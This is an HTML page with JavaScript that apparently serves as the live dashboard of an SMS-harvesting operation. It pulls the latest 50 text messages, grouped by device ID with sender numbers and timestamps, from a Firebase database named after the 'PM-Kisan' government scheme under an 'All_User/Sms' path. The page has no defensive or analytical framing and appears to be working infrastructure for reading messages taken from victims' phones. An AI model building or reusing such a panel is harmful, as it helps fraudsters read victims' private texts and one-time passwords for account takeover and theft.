<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>All SMS - Live Feed</title>

    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }

        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.9rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            transition: 0.2s;
        }

        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }

        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.2s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .meta {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            font-size: 0.85rem;
            color: #10b981;
            margin-bottom: 8px;
            font-weight: bold;
        }

        .time {
            color: #94a3b8;
            font-weight: normal;
            white-space: nowrap;
        }

        .msg {
            margin: 0;
            line-height: 1.5;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 0.95rem;
        }

        .info {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #334155;
            padding-top: 5px;
            word-break: break-word;
        }

        .device-id {
            font-size: 0.7rem;
            color: #475569;
            background: #0f172a;
            padding: 2px 8px;
            border-radius: 4px;
        }

        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #334155;
            border-top: 2px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .status-badge {
            font-size: 0.75rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
            white-space: nowrap;
        }

        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }

        .error {
            color: #ef4444;
            padding: 20px;
            text-align: center;
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="header">

            <div>
                <a href="index.html" class="back-btn">← Back</a>
                <span style="margin-left: 12px;">📨 All SMS</span>
            </div>

            <span id="counter" class="status-badge">
                Loading...
            </span>

        </div>

        <div id="sms-container">

            <div class="loading">
                <span class="spinner"></span>
                Loading recent messages...
            </div>

        </div>

    </div>


    <script type="module">

        /*
        ==========================================
        FIREBASE IMPORTS
        ==========================================
        */

        import {
            initializeApp
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";

        import {
            getDatabase,
            ref,
            query,
            limitToLast,
            onValue
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";


        /*
        ==========================================
        HTML ELEMENTS
        ==========================================
        */

        const container = document.getElementById('sms-container');
        const counter = document.getElementById('counter');


        /*
        ==========================================
        FIREBASE INITIALIZATION
        ==========================================
        */

        const app = initializeApp({

            databaseURL:
                "https://pm-kisan-05jg-default-rtdb.firebaseio.com"

        });


        const db = getDatabase(app);


        /*
        ==========================================
        SMS DATABASE REFERENCE
        ==========================================
        */

        const smsRef = ref(
            db,
            'csc5/All_User/Sms'
        );


        /*
        ==========================================
        FETCH ONLY THE LATEST 50 SMS
        ==========================================

        Your SMS records use Firebase Push IDs.

        limitToLast(50) means Firebase will only
        retrieve the latest 50 records instead of
        downloading all 5000+ messages.

        ==========================================
        */

        // New database structure:
        // Sms/{deviceId}/{smsId} = { date, msg, ph }
        //
        // Because SMS records are nested under device IDs, Firebase
        // cannot use limitToLast(50) here to get the latest 50 SMS
        // globally. We fetch the device groups and flatten their SMS
        // records in the browser, then sort by the numeric date field.
        const recentSmsQuery = smsRef;


        /*
        ==========================================
        CREATE SMS CARD
        ==========================================
        */

        function createSmsCard(sms) {

            const sender =
                sms.ph || "Unknown";

            const message =
                sms.msg || "";

            const timestamp =
                Number(sms.date);

            const time =
                Number.isFinite(timestamp)
                    ? new Date(timestamp).toLocaleString()
                    : "N/A";

            const deviceId =
                sms.deviceId || "";


            // Main card
            const card =
                document.createElement('div');

            card.className =
                'sms-card';


            // Meta section
            const meta =
                document.createElement('div');

            meta.className =
                'meta';


            // Sender
            const senderElement =
                document.createElement('span');

            senderElement.textContent =
                `📨 ${sender}`;


            // Time
            const timeElement =
                document.createElement('span');

            timeElement.className =
                'time';

            timeElement.textContent =
                `🕐 ${time}`;


            meta.appendChild(
                senderElement
            );

            meta.appendChild(
                timeElement
            );


            // Message
            const messageElement =
                document.createElement('p');

            messageElement.className =
                'msg';

            messageElement.textContent =
                message;


            card.appendChild(
                meta
            );

            card.appendChild(
                messageElement
            );


            /*
            ======================================
            OPTIONAL DEVICE ID
            ======================================
            */

            if (deviceId) {

                const deviceInfo =
                    document.createElement('div');

                deviceInfo.className =
                    'info';


                const deviceLabel =
                    document.createTextNode(
                        '📱 Device: '
                    );


                const deviceElement =
                    document.createElement('span');

                deviceElement.className =
                    'device-id';

                deviceElement.textContent =
                    deviceId;


                deviceInfo.appendChild(
                    deviceLabel
                );

                deviceInfo.appendChild(
                    deviceElement
                );


                card.appendChild(
                    deviceInfo
                );

            }


            return card;

        }


        /*
        ==========================================
        LIVE FIREBASE LISTENER
        ==========================================

        This listens ONLY to the latest 50 SMS.

        When a new SMS arrives:

        1. New SMS enters the 50-message query
        2. Oldest SMS drops out
        3. New SMS appears at the top

        ==========================================
        */

        onValue(

            recentSmsQuery,

            (snapshot) => {


                /*
                ==================================
                NO SMS FOUND
                ==================================
                */

                if (!snapshot.exists()) {

                    container.innerHTML =
                        '<div class="error">📭 No messages found</div>';

                    counter.textContent =
                        '0 messages';

                    counter.classList.remove(
                        'live'
                    );

                    return;

                }


                /*
                ==================================
                CREATE MESSAGE ARRAY
                ==================================

                New structure:

                Sms
                  └── deviceId
                      └── smsId
                          ├── date
                          ├── msg
                          └── ph
                ==================================
                */

                const messages = [];

                snapshot.forEach((deviceSnapshot) => {

                    const deviceId = deviceSnapshot.key;
                    const deviceMessages = deviceSnapshot.val();

                    if (!deviceMessages || typeof deviceMessages !== 'object') {
                        return;
                    }

                    Object.entries(deviceMessages).forEach(
                        ([smsId, sms]) => {

                            if (!sms || typeof sms !== 'object') {
                                return;
                            }

                            messages.push({
                                id: smsId,
                                deviceId: deviceId,
                                ...sms
                            });

                        }
                    );

                });

                /*
                ==================================
                SORT BY DATE
                ==================================

                The new database stores the SMS timestamp
                in the "date" field as milliseconds.
                ==================================
                */

                messages.sort(
                    (a, b) =>
                        Number(b.date || 0) - Number(a.date || 0)
                );

                // Keep only the newest 50 SMS after sorting.
                const recentMessages = messages.slice(0, 50);

                /*
                ==================================
                UPDATE COUNTER
                ==================================
                */

                counter.textContent =
                    `${recentMessages.length} recent messages`;

                counter.classList.add(
                    'live'
                );


                /*
                ==================================
                CLEAR OLD DISPLAY
                ==================================
                */

                container.innerHTML =
                    '';


                /*
                ==================================
                CREATE DOCUMENT FRAGMENT
                ==================================

                This improves rendering performance.
                ==================================
                */

                const fragment =
                    document.createDocumentFragment();


                /*
                ==================================
                ADD 50 SMS CARDS
                ==================================
                */

                for (const sms of recentMessages) {

                    fragment.appendChild(
                        createSmsCard(sms)
                    );

                }


                /*
                ==================================
                DISPLAY MESSAGES
                ==================================
                */

                container.appendChild(
                    fragment
                );

            },


            /*
            ======================================
            FIREBASE ERROR
            ======================================
            */

            (error) => {

                console.error(
                    'Firebase Error:',
                    error
                );

                container.innerHTML =
                    `<div class="error">❌ ${error.message}</div>`;

                counter.textContent =
                    'Error';

                counter.classList.remove(
                    'live'
                );

            }

        );

    </script>

</body>
</html>
